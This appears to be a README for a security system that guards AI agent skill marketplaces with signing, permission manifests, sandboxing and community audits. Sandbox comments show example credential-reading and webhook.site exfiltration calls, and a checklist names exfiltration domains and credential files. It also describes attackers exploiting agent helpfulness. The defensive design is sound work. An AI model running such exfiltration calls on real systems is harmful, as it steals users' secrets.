# TAIS Skill Security System

## Overview
The TAIS Skill Security System addresses the critical supply chain attack vector identified in agent ecosystems. This system provides cryptographic verification, permission enforcement, and community auditing for agent skills.

## Attack Vector Addressed
The Moltbook/ClawdHub incident revealed:
- Unsigned skills with disguised credential stealers
- Skills reading `~/.clawdbot/.env` and exfiltrating to webhook.site
- 286 skills scanned, 1 contained malicious code
- Attackers exploit agent helpfulness to install arbitrary code

## How TAIS Prevents This

### 1. Cryptographic Signing & Verification
```typescript
const skillHash = crypto.createHash('sha256').update(manifest).digest('hex');
const signature = crypto.sign(hash, authorPrivateKey);
const verified = crypto.verify(signature, authorPublicKey);
```

**Benefits:**
- Skills cannot be forged or modified without detection
- Author identity is cryptographically proven
- Supply chain integrity from publisher → user

### 2. On-Chain Identity Verification
```typescript
await nftService.verifyOwnership(authorWallet);
// Returns true only if author holds Publisher NFT
```

**Benefits:**
- Cost barrier to spam publishers
- Immutable identity on blockchain
- Wallet = public key for verification

### 3. Permission Manifests
```typescript
{
  permissions: {
    network: { domains: ["api.openweathermap.org"] },
    env_vars: ["WEATHER_API_KEY"],
    filesystem: { read: [], write: [] }
  }
}
```

**Benefits:**
- User reviews access before installation
- Red flags visible (webhook.site, .env access)
- Explicit consent model

### 4. Sandbox Execution
```typescript
const sandbox = new SandboxService(manifest.permissions);
const result = await sandbox.executeSkill(skillCode);
// Blocks: fs.readFile("~/.clawdbot/.env")
// Blocks: fetch("https://webhook.site/exfil")
```

**Benefits:**
- Runtime enforcement of declared permissions
- Prevents privilege escalation
- Violations logged and reported

### 5. Isnad Chain (Provenance)
```typescript
{
  provenance: {
    author_signature: "0x...",
    auditors: [
      { wallet: "0xRufio", role: "auditor", signature: "0x..." }
    ],
    isnad_chain: ["0xAlice", "0xRufio"],
    trust_score: 0.85
  }
}
```

**Benefits:**
- Chain of trust visible to users
- Social proof from trusted auditors
- Trust score calculation (author + auditors + vouchers)

### 6. Community Audits
```typescript
{
  status: "malicious",
  findings: [
    { severity: "critical", rule_name: "Credential_Stealer" }
  ]
}
```

**Benefits:**
- Collective immunity against new threats
- YARA scans for pattern detection
- Audit history available for review

## Usage Examples

### Install a Skill
```typescript
import { installSkill } from '@think/profile-sdk';

const result = await installSkill(manifest, skillCode);
// Returns: { success, skillHash, warnings }
```

### Submit an Audit
```typescript
import { submitSkillAudit } from '@think/profile-sdk';

const result = await submitSkillAudit({
  skill_hash: 'abc123',
  auditor: '0xRufio',
  status: 'safe',
  findings: [],
  // ...
});
```

### Check Malicious Status
```typescript
import { checkSkillMalicious } from '@think/profile-sdk';

const isMalicious = await checkSkillMalicious(skillHash);
// Returns: true if flagged by community
```

## Security Checklist for Skill Authors

- [ ] I hold a Publisher NFT
- [ ] Skill manifest is cryptographically signed
- [ ] Permissions declare minimal necessary access
- [ ] No webhook.site, pastebin.com, or similar exfiltration domains
- [ ] No access to .env, .secret, or credential files
- [ ] Code has been reviewed by trusted auditor
- [ ] YARA scan shows no malicious patterns
- [ ] Skill tested in sandbox environment

## Trust Score Calculation

| Contribution | Score | Max |
|--------------|--------|------|
| Author (Publisher NFT) | +30 | 30 |
| Auditor (Auditor NFT) | +20 | ∞ |
| Voucher (Reputation) | +10 | ∞ |
| Freshness (< 30 days) | +Decay | 30 |

Score = min(1.0, total / 100)

## Integration Guide

For Agent Platforms (Moltbook, ClawdHub):

1. Replace `npm install <skill>` with TAIS-powered installer
2. Display permission review dialog before installation
3. Show isnad chain and audit summary
4. Execute skills in SandboxService
5. Report security violations to AuditRegistry

## Contributing

Run the demo:
```bash
node examples/skill-security-demo.ts
```

This shows:
- Safe skill installation
- Malicious skill blocking
- Audit submission
- Trust score calculation
